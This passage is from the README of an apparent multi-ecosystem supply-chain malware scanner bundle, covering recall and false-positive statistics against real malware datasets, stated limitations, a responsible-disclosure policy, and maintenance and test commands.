| `gha` | incident replay: real compromised-action commits (2025-03 and 2026-03 incidents), fetched by SHA or from Software Heritage (109 samples, 5 distinct); unit: commits; [report](https://github.com/eltociear/gha-audit/blob/4d694584c6746f2589b38da7a3b1af3cdee81b55/RECALL.md) | held-out, independent payloads, n=34: 34/34 (100%) → **34/34 (100%)** (2 distinct payloads; same technique family as the tuning payloads)<br>held-out, byte-identical to a tuning payload, n=72: 72/72 (100%) → **72/72 (100%)** (not independent) | tuning, n=3: 3/3 (100%) → 3/3 (100%) | 0 → 0 of 607 (action.yml files re-fetched by the calibration method (overlaps calibration)) |
| `gomod` | incident replay: reported malicious module versions as the Go proxy served them (research artifacts, Software Heritage, one live copy); unit: modules; [report](https://github.com/eltociear/gomod-audit/blob/cab5376de03ca12b5e836d378bffbde078fefe2f/RECALL.md) | held-out, n=2: 1/2 (50%) → **2/2 (100%)** (small and correlated: a smoke test, not a rate) | tuning, n=25: 20/25 (80%) → 25/25 (100%) | 0 → 0 of 510 (every third module of the original ranking, re-resolved 2026-11-27) |
| `npm` | real malware: DataDog malicious-software-packages-dataset (npm, 2024-2026) (995 samples, 672 distinct); unit: distinct payloads (deduped); [report](https://github.com/eltociear/npm-audit/blob/80f08775f2731f3826cc181781ad7c4d0f19e9a8/RECALL.md) | held-out (unseen families), n=267: 157/267 (58.8%) → **196/267 (73.4%)** | tune, n=405: 262/405 (64.7%) → 340/405 (84%) | 4 → 5 of 2,063 (popular packages re-fetched 2026-11-27 (calibration, original held-out, three fresh rank bands)); precision about where it was, not better; the set blind for the final engine (383) has 1 false positive |
| `packagist` | incident replay: real malicious Composer commits (2026 tag rewrites), fetched by commit from GitHub; unit: packages; [report](https://github.com/eltociear/packagist-audit/blob/1ccd78b7cf7e25040979786c14945fed52a7f2be/RECALL.md) | held-out, n=1: 0/1 (0%) → **0/1 (0%)** (caught only by a fix made after the held-out scan) | tuning, n=2: 0/2 (0%) → 2/2 (100%) | 1 → 1 of 520 (every composer-plugin of the calibration set + popular packages, re-fetched 2026-11-27) |
| `pypi` | real malware: DataDog malicious-software-packages-dataset (PyPI, 2022-2026) (1,000 samples, 518 distinct); unit: distinct payloads (deduped); [report](https://github.com/eltociear/pypi-audit/blob/71db9166b5f9f7b45805b99553f8921ec3abb5c0/RECALL.md) | held-out (family-disjoint), n=207: 112/207 (54.1%) → **159/210 (75.7%)** (denominator moves 207 → 210 because the new loader reads oversized setup.py files) | tune, n=311: 145/311 (46.6%) → 269/311 (86.5%) | 1 → 1 of 767 (fresh benign held-out (ranks 2,001-2,800, never used before); 2,142 benign re-checked in all); the same package both before and after |
| `rubygems` | incident replay: extracted removed gems from public research datasets (leedyun/package, malcontent-samples); unit: gems; [report](https://github.com/eltociear/rubygems-audit/blob/3c26250ffa56c703e66f8b4b1c03d50184406777/RECALL.md) | held-out, n=2: – → **0/2 (0%)** (both fixed afterwards; reported as fixes, not recall) | tuning (93% one 2020 campaign), n=813: 782/813 (96.2%) → 811/813 (99.8%) (0.1.0 column is blind; 0.2.0 was tuned on these) | 0 → 0 of 600 (600 most-downloaded gems re-fetched 2026-11-27) |
| `vsix` | real malware: 4 removed extensions archived by researchers + 20 own reconstructions + 17 third-party malicious samples; unit: extensions; [report](https://github.com/eltociear/vsix-audit/blob/7b82c369dc7a43a060a614c75248d68ece60a4f9/FINDINGS.md) | third-party samples (held out), n=17: 3/17 (17.6%) → **4/17 (23.5%)** (11 of the 17 are defanged demos with no executable payload) | real samples (tuned on), n=4: 1/4 (25%) → 4/4 (100%)<br>own reconstructions (tuned on), n=20: 7/20 (35%) → 19/20 (95%) | 3 → 3 of 937 (original calibration corpus re-downloaded 2026-11-27); fresh held-out set 3 (893, frozen engine): 7 false positives (0.8%), 10 flagged (1.1%) |

No real-malware or incident-replay set yet (recall = own canaries only): `aur`, `blender`, `browserext`, `comfyui`, `hacs`, `hf`, `homebrew`, `mcp`, `nuget`, `obsidian`, `repo-trust`, `terraform`, `userscript`, `vimplugin`, `winpkg`, `wordpress`.
<!-- /gen_stats:recall -->

## Honest limitations

- **Recall on real malware is measured for 8 of 24 scanners, and it is modest.** The blind
  held-out numbers (npm 73%, pypi 76% of distinct payloads; crate 15/38 files; vsix 4/17
  third-party samples) are the honest ones; the other 16 scanners still have only self-written
  canaries, which prove the rules fire on those shapes, not that they catch the next attack.
  See [Recall on real malware](#recall-on-real-malware).
- **Static and pattern-based.** No code is executed, so anything decided at runtime (fetched
  second stages, heavy obfuscation, encrypted payloads) is only visible through its loader, and
  a determined attacker who reads the rules can write around them.
- **False-positive rates are for popular packages.** The calibration and held-out corpora are
  the top of each registry plus random samples; code in the long tail looks different.
- **The normalised `verdict` is each scanner's own.** Scoring differs per ecosystem (what runs
  at install time weighs more than library code); `sca` does not re-score, it only maps.
- **Auto-detection is marker-based** and prunes `node_modules`, `vendor` and dot-dirs; it can
  miss an ecosystem with no manifest, and `--deps` modes need the network and the registries'
  goodwill (rate limits, removed versions).
- **Several ecosystems were checked on a single corpus snapshot** (dates in each FINDINGS.md);
  registries move.

## Responsible disclosure

Nothing malicious is named in this repo or in the scanners' FINDINGS files unless it was
already removed and publicly documented. When a scan of a live package turns up something that
looks malicious, it is reported privately to the registry's security team (and the maintainer
where appropriate) and only described in aggregate until it is gone. If `sca` flags something
real for you, please do the same: report it to the registry (npm, PyPI, RubyGems, crates.io,
Packagist, NuGet, Open VSX / VS Marketplace, Chrome Web Store / AMO, Hugging Face, the AUR, ...)
rather than in a public issue. False positives and missed shapes are welcome as public issues on
the individual scanner repo - with a minimal inert reproduction, never a live payload.

## Keeping the scanners current

```sh
python3 scripts/sync.py            # re-vendor all 24 at their latest commit (git; HTTPS, then SSH)
python3 scripts/sync.py npm pypi   # just these
python3 scripts/sync.py --check    # which vendored copies are behind
python3 scripts/gen_stats.py       # then refresh family_stats.json + the README number sections
```

`sync.py` copies each scanner's single file, its `LICENSE` and its `tests/` tree (canaries +
benign controls) into `scanners/<repo>/`, and records repo, commit SHA, sha256 and time in
[`scanners/VERSIONS.json`](scanners/VERSIONS.json). Do not edit the vendored copies; change the
upstream repo and re-sync. The scanners are MIT licensed by their author; each vendored dir keeps
its `LICENSE` and a `VENDORED.md` with the source commit.

## Tests

```sh
python3 -m unittest discover -s tests -v   # ~2 minutes, offline
python3 tests/canaries.py                  # the per-scanner canary table
```

- `tests/test_canaries.py` replays **every vendored scanner's own canaries through sca**: the
  expected levels are read (`ast.literal_eval`, never imported) from each repo's test file, so a
  re-sync replays the new canaries automatically. Every malicious canary must come out with
  `max_severity` at or above its expected level and keep its expected rule id through
  normalisation; every benign control must stay at or below MEDIUM (or the ceiling its own suite
  allows).
  <!-- gen_stats:canary-count -->
  At the vendored commits: **414 malicious canaries and 258 benign controls** across all 24 scanners, every one required to pass.
  <!-- /gen_stats:canary-count -->
- `tests/test_stats.py`: the README's generated sections (family table, recall table, canary
  count) match `family_stats.json`, and that JSON was generated at the vendored commits.
- `tests/test_detect.py`: auto-detection on small fixture trees for all 24 ecosystems plus a
  monorepo, single files, `--deps` planning.
- `tests/test_report.py`: normalisation of every output shape (classic, list, family envelope,
  winpkg `file:Lnn`, error forms), the JSON report against the schema, SARIF 2.1.0 structure
  (one run per scanner, rule indices, levels, regions), exit codes, pass-through and `--raw`.

## License

MIT - see [LICENSE](LICENSE). Vendored scanners: MIT, see `scanners/<repo>/LICENSE`.
